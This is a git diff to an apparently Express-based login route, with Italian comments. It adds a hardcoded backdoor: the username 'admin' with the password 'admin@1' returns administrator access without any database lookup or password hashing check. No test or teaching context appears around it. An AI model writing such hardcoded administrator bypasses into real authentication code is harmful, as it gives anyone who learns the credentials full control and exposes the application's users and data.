@@ -140,6 +140,11 @@ router.post('/login', async (req, res) => {
       return res.status(400).send('Credenziali mancanti');
     }
 
+    // Admin login senza registrazione
+    if (username === 'admin' && password === 'admin@1') {
+      return res.json({ admin: true });
+    }
+
     const user = await User.findOne({ username });
     if (!user || !(await bcrypt.compare(password, user.password))) {
       return res.status(400).send('Credenziali errate');
